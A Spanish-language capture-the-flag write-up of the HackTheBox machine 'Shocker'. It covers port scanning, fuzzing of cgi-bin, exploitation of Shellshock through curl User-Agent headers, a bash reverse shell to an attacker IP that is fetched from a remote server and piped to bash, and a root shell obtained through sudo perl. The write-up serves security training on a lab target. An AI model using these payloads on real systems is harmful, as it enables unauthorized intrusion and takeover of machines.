---
layout      : post
title       : "HackTheBox - Shocker"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108banner.png
category    : [ htb ]
tags        : [ shellshock, sudo, perl ]
---
Máquina Linux nivel fácil, nos dará un **shock** (?) al encontrarnos la vulnerabilidad **Shellshock** (muy linda) y lograr ejecutar comandos en el sistema. Después jugando con los permisos de usuario podremos obtener una sesión como **root** explotando el binario **Perl**.

![108shockerHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108shockerHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [mrb3n](https://www.hackthebox.eu/profile/2984).

HOLAAAAAAAAAAAA e.e

Bueno, será una ruta sencilla y acogedora :3 Nos encontraremos un servicio web el cual tiene el directorio `cgi-bin` y dentro un archivo `user.sh`, indagando veremos que podemos relacionar lo encontrado con una vulnerabilidad llamada **Shellshock**, jugando con ella lograremos ejecutar comandos en el sistema como el usuario **shelly**, lo usaremos para entablarnos una reverse Shell.

Estando dentro y validando los permisos que tenemos como **shelly** ante otros usuarios (`sudo -l`), veremos que podemos ejecutar el binario `/usr/bin/perl` como el usuario **root**, con la ayuda del repositorio [GTFOBins](https://gtfobins.github.io/) (e internet :P) lograremos obtener una (dos, tres, las que quieras) Shell como **root** en la máquina (:

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

¿Khe vamo hace'? 🤔

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizamos nuestro escaneo de puertos para saber que servicios está corriendo la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.56 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                      |
| --open     | Solo los puertos que están abiertos          |
| -v         | Permite ver en consola lo que va encontrando |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
❭ cat initScan 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: initScan
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.56
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.10.10.56 ()    Status: Up
   4   │ Host: 10.10.10.56 ()    Ports: 80/open/tcp//http///, 2222/open/tcp//EtherNetIP-1///
   5   │ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 163.27 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Listos, tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://www.techopedia.com/definition/15709/port-80)**                         |
| 2222   | Por ahora no lo sabemos, pero podemos pensar en que pueda estar relacionado con **SSH** |

Ahora hagamos un escaneo de scripts y versiones, así tenemos profundizamos en cada puerto:

```bash
❭ nmap -p80,2222 -sC -sV 10.10.10.56 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: portScan
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p80,2222 -sC -sV -oN portScan 10.10.10.56
   2   │ Nmap scan report for 10.10.10.56
   3   │ Host is up (0.19s latency).
   4   │ 
   5   │ PORT     STATE SERVICE VERSION
   6   │ 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
   7   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
   8   │ |_http-title: Site doesn't have a title (text/html).
   9   │ 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
  10   │ | ssh-hostkey: 
  11   │ |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
  12   │ |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
  13   │ |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  15   │ 
  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  17   │ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 17.76 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache httpd 2.4.18 |
| 2222   | [SSH](https://blog.desdelinux.net/configurar-ssh-por-otro-puerto-y-no-por-el-22/) | (Confirmamos) OpenSSH 7.2p2 |

¡Listo, a darle pues!

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![108page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108page80.png)

Jmm, nada interesante, validando el código fuente tampoco vemos nada, hagamos fuzzing a ver si hay algo escondido a la vista:

```bash
❭ dirsearch.py -u http://10.10.10.56/ -q
403 -  297B  - http://10.10.10.56/.ht_wsr.txt
403 -  300B  - http://10.10.10.56/.htaccess.bak1
403 -  300B  - http://10.10.10.56/.htaccess.orig
403 -  302B  - http://10.10.10.56/.htaccess.sample
403 -  300B  - http://10.10.10.56/.htaccess.save
403 -  298B  - http://10.10.10.56/.htaccessBAK
403 -  298B  - http://10.10.10.56/.htaccessOLD
403 -  301B  - http://10.10.10.56/.htaccess_extra 
403 -  299B  - http://10.10.10.56/.htaccessOLD2
403 -  300B  - http://10.10.10.56/.htaccess_orig
403 -  298B  - http://10.10.10.56/.htaccess_sc
403 -  290B  - http://10.10.10.56/.htm
403 -  291B  - http://10.10.10.56/.html
403 -  300B  - http://10.10.10.56/.htpasswd_test
403 -  296B  - http://10.10.10.56/.htpasswds
403 -  297B  - http://10.10.10.56/.httr-oauth
403 -  294B  - http://10.10.10.56/cgi-bin/
200 -  137B  - http://10.10.10.56/index.html
403 -  299B  - http://10.10.10.56/server-status
```

Nada relevante a la vista, pero profundizando en lo único que tenemos, vemos el directorio `cgi-bin/`, entendamos de que se trata:

> **CGI** (Common Gateway Interface) es un método por el cual un servidor web puede interactuar con programas externos de generación de contenido, a ellos nos referimos comúnmente como programas CGI o scripts CGI. Es el método más común y sencillo de mostrar contenido dinámico en su sitio web. [Apache - CGI](https://httpd.apache.org/docs/trunk/es/howto/cgi.html).

Entonces el servidor envía las solicitudes del cliente a un programa externo, el programa en cuestión puede estar escrito en cualquier lenguaje que sea soportado pro el servidor, que por lo general son lenguajes de scripting.

> El **CGI** es utilizado comúnmente para contadores, bases de datos, motores de búsqueda, formulários, generadores de email automático, foros de discusión, chats, comercio electrónico, rotadores y mapas de imágenes, juegos en línea y otros. Esta tecnología tiene la ventaja de correr en el servidor cuando el usuario lo solicita por lo que es dependiente del servidor y no de la computadora del usuario. [CGI Intro](http://www.maestrosdelweb.com/cgiintro/).

Bien, hablan de scripts y programas alojados por el recurso `cgi`, así que podemos probar un fuzz sobre el recurso...

Pero no encontramos nada, si recordamos nos hablaban de lenguajes de scripting, entonces podemos probar a crearnos un archivo con extensiones de lenguajes y volver a validar el fuzzeo:

> [Encontrar URL del cgi-bin](https://www.neoguias.com/como-saber-la-url-de-cgi-bin/) (vemos algunos lenguajes para tener en cuenta).

```bash
❭ cat extensions.txt 
───────┬──────────────────────────────────────
       │ File: extensions.txt
───────┼──────────────────────────────────────
   1   │ php
   2   │ sh
   3   │ bash
   4   │ cgi
   5   │ pl
   6   │ c
   7   │ ccp
   8   │ py
───────┴──────────────────────────────────────
```

Y ahora con `wfuzz`:

```bash
❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt -w extensions.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
```

Donde el primer **FUZZ** hace referencia a cada linea del archivo `common.txt` y el segundo **FUZZ (FUZ2Z)** a cada linea del archivo `extensions.txt`:

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
Total requests: 37264

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
...
...
...
000034130:   200        7 L      17 W       118 Ch      "user - sh"
```

Perfecto, tenemos un archivo llamado `user.sh`, si lo visitamos desde la web nos lo descarga, su contenido es simplemente:

```bash
❭ cat user.sh 
───────┬─────────────────────────────────────────────────────────────────────
       │ File: user.sh
───────┼─────────────────────────────────────────────────────────────────────
   1   │ Content-Type: text/plain
   2   │ 
   3   │ Just an uptime test script
   4   │ 
   5   │  12:36:04 up  1:35,  0 users,  load average: 0.00, 0.01, 0.00
───────┴─────────────────────────────────────────────────────────────────────
```

Jmmm, pero ¿qué podemos hacer con esto? Haciendo una búsqueda sencilla en Google como "**cgi-bin exploit**" obtenemos un montón de respuestas hablando de una vulnerabilidad llamada **Shellshock**, profundizando...

#### Shellshock

Me gusto esta intro de [securityhacklabs](https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit) para explicar **Apache** y **CGI**, así que me la robo :P

> Apache es un servidor web multiplataforma de código abierto desarrollado por la Apache Software Foundation. Es robusto con características tales como alojamiento virtual, esquemas de autenticación, SSL y TLS, mensajes de error personalizados y compatibilidad con múltiples lenguajes de programación. Apache también tiene un módulo llamado mod_cgi que maneja la ejecución de scripts de Common Gateway Interface (CGI). [Explotando Shellshock](https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit).

Shellshock como su nombre nos spoilea, se basa en la Shell (en términos entendibles en la famosa **bash**), un intérprete que esta por lo general en todos los sistemas ***Unix**. Lo que hace la vulnerabilidad es aprovechar las variables de entorno para definir funciones y jugar a agregar comandos así la función ya se haya terminado de procesar :P

Pa leer: 

* [Shellshock, la grave vulnerabilidad en Bash](https://www.welivesecurity.com/la-es/2014/09/26/shellshock-grave-vulnerabilidad-bash/).
* [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271).
* [Shellshock - como explotarla en remoto](https://empresas.blogthinkbig.com/shellshock-como-se-podria-explotar-en/).
* [Exploit Bash Shellshock](https://nikhilh20.medium.com/exploit-bash-shellshock-part-1-ad1636acaf9e).

...

## Explotación [#](#explotacion) {#explotacion}

Entonces, podemos validar esta vulnerabilidad de manera sencilla mediante **cURL** probando cositas de [esta guía](https://book.hacktricks.xyz/pentesting/pentesting-web/cgi):


```bash
❭ curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh
```

Y nos responde:

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
```

Podríamos pensar que no es vulnerable, pero leyendo más posts encontramos que si le agregamos más definiciones de `echo;` antes de lo que queremos ejecutar puede llegar a rular (servir):

* [Exploiting Shellshock (with extra **echo;**)](https://www.sevenlayers.com/index.php/125-exploiting-shellshock).

```bash
❭ curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh
```

Y responde:

```bash
VULNERABLE TO SHELLSHOCK

Content-Type: text/plain

Just an uptime test script

 13:25:00 up  2:23,  0 users,  load average: 0.00, 0.00, 0.00
```

Bien, probablemente tenemos ejecución de comandos, validemos el `id` del usuario que esté ejecutando el servicio web:

```bash
❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://10.10.10.56/cgi-bin/user.sh
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Perfectooooooooooooooooooooo 😯, confirmado. Ahora simplemente intentemos entablar una Reverse Shell ;)

Validamos que exista **cURL** en la máquina:

```bash
❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/which curl' http://10.10.10.56/cgi-bin/user.sh
/usr/bin/curl
```

Nos creamos un archivo que tenga los comandos que queramos ejecutar, para que cuando hagamos la petición desde la máquina a él le pasemos el binario `bash` al final y así interprete el contenido:

```bash
❭ cat rev.sh 
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.15/4433 0>&1
```

Levantamos un server web:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y nos ponemos en escucha:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Y desde el Shellshock le indicamos:

```bash
❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/curl http://10.10.14.15:8000/rev.sh | /bin/bash' http://10.10.10.56/cgi-bin/user.sh
```

Y obtenemos:

![108bash_shellshock_shelly_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108bash_shellshock_shelly_revsh.png)

Una sesión como **shelly** :) Hagamos tratamiento de la TTY rápidamente (hay varias formas, a mí me gusta de la siguiente), así evitamos perder la consola si damos **CTRL + C** y además podemos movernos cómodamente entre comandos:

1. En la Shell escribimos: `script /dev/null -c bash`.
2. Ahora hacemos `CTRL + Z`, lo que enviara la Shell a un estado "en pausa" por así decirlo y nos llevara a nuestra terminal normalita.
3. Escribimos: `stty raw -echo; fg`.
4. Escribimos: `reset`.
5. Escribimos: `xterm`.
6. **Ya tendríamos nuestra Shell interactiva, pero arreglemos unos valores y el tamaño de la terminal:**
7. Escribimos: `export TERM=xterm`.
8. Escribimos: `export SHELL=bash`.
9. Abrimos una nueva terminal de tamaño completo y escribimos `stty -a`, tomamos esos valores y en la Shell de la máquina escribimos: `stty rows <rows> columns <columns>`, validamos que el tamaño esté bien ejecutando `nano`. (Podrías validar el `nano` también antes de hacer esto, así vez el cambio).

Sigamos...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si vemos que [permisos](https://unix.stackexchange.com/questions/596542/what-is-the-use-of-sudo-l-command) tiene **shelly** para ejecutar comandos en el sistema como otros usuarios encontramos:

```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Puede ejecutar el binario `/usr/bin/perl` como el usuario **root** sin necesidad de ingresar contraseña, esto mediante [sudo](https://www.linuxtotal.com.mx/index.php?cont=info_admon_014).

Si vamos al [repo (GTFOBins)](https://gtfobins.github.io/gtfobins/perl/#sudo) que tiene un montoooooooon de info sobre como explotar vaaarios binarios, nos encontramos con:

![108google_gtfobins_sudoPerl](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108google_gtfobins_sudoPerl.png)

Bien, sencillamente pasándole esa instrucción deberíamos obtener una Shell como el usuario (en este caso) **root**, probemos:

```bash
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

![108bash_exploit_sudoPerl_rootSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108bash_exploit_sudoPerl_rootSH.png)

Perfectoooo, ya seriamos **root** y podríamos hacer lo que quisiéramos

**(Claramente puedes jugar con [reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl) de** perl **y demás cositas para entablar una sesión como** root **, es cuestión de jugar y no quedarse solo con una opción.)**

Solo nos quedaría ver las flags...

![108flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108flags.png)

...

Super interesante la vulnerabilidad del **Shellshock**, ya siempre que encontremos un directorio `cgi-bin/` sabemos que debemos buscar posiblemente algo relacionado con ella y además aprendimos que puede parecer que ha fallado, pero simplemente deberíamos agregarle la sentencia `echo;` e ir probando :P

Y weno, como siempre muchísimas gracias por pasarse yyyyyyyyyyyyy a seguir rompiendo todo!! ❤️